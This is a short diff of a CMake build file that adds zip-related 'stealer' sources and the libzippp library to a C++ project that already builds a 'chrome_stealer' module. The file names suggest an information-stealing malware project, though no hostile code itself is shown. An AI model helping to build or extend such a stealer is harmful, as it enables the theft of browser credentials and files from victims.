@@ -19,10 +19,15 @@ add_executable(${PROJECT_NAME} main.cpp
         stealers/chrome_stealer.cpp
         stealers/chrome_stealer.h
         messages/error_message.h
+        stealers/zip_stealer.cpp
+        stealers/zip_stealer.h
+        stealers/zipable.h
+        messages/file_message.h
 )
 
 target_link_libraries(${PROJECT_NAME} PRIVATE
         ${Boost_LIBRARIES}
         openssl::openssl
-        SQLiteCpp)
+        SQLiteCpp
+        libzippp::libzippp)
 target_include_directories(${PROJECT_NAME} PRIVATE .)
